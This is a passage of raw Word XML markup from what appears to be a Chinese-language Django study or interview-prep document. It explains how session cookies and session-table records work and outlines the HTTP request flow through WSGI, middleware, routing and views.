    <w:p w14:paraId="46386FE3"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Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>—</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>表中创建一条记录</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1668E0"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 xml:space="preserve">       session-key                                     session-data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33313950"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 xml:space="preserve">       ltv8zy1kh5lxj1if1fcs2pqwodumr45t                  </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>更新数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3171FD13"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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01AE6F69"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 xml:space="preserve">    1 </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>生成随机字符串</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">   ltv8zy1kh5lxj1if1fcs2pqwodumr45t</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1603B4A6"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 xml:space="preserve">    2 response.set_cookie("sessionid",ltv8zy1kh5lxj1if1fcs2pqwodumr45t)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9D57BF"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 xml:space="preserve">    3 </w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>—</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>表中创建一条记录</w:t>
      </w:r>
      <w:r w:rsidRPr="008721E6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F437CC" w14:textId="77777777" w:rsidR="00D8288D"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 xml:space="preserve">       session-key                                     session-data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF57B19" w14:textId="783C2F6C"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">       ltv8zy1kh5lxj1if1fcs2pqwodumr45t       {"is_login":True,"username":"yuan"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57803ABC" w14:textId="69E9FF54" w:rsidR="006B2B80" w:rsidRDefault="008721E6" w:rsidP="003A7EFD">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4F4F4F"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="t26"/>
      <w:bookmarkEnd w:id="16"/>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35</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简述</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对</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="003A7EFD">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求的执行流程？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5A112A" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="005D1318" w:rsidRDefault="006B2B80"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Pr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>  </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在接受一个</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求之前的准备</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>启动一个支持</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>网关协议的服务器监听端口等待外界的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求，比如</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>自带的开发者服务器或者</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器。</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3351746A" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="005D1318" w:rsidRDefault="006B2B80"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color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>    </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器根据</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议指定相应的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Handler</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来处理</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求，并且初始化该</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Handler</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，在</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>框架中由框架自身负责实现这一个</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Handler</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>此时服务器已处于监听状态，可以接受外界的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>当一个</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求到达服务器的时候</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56EBDF99" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="005D1318" w:rsidRDefault="006B2B80"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color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>    </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务器根据</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议从</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求中提取出必要的参数组成一个字典（</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>environ</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）并传入</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Handler</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中进行处理。</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EDC94C" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRPr="005D1318" w:rsidRDefault="006B2B80"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color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>    </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Handler</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中对已经符合</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议标准规定的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求进行分析，比如加载</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>提供的中间件，路由分配，调用路由匹配的视图等。</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>返回一个可以被浏览器解析的符合</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议的</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r w:rsidRPr="005D1318">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5044DA" w14:textId="68C5AFC2" w:rsidR="006B2B80" w:rsidRDefault="008721E6" w:rsidP="003A7EFD">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
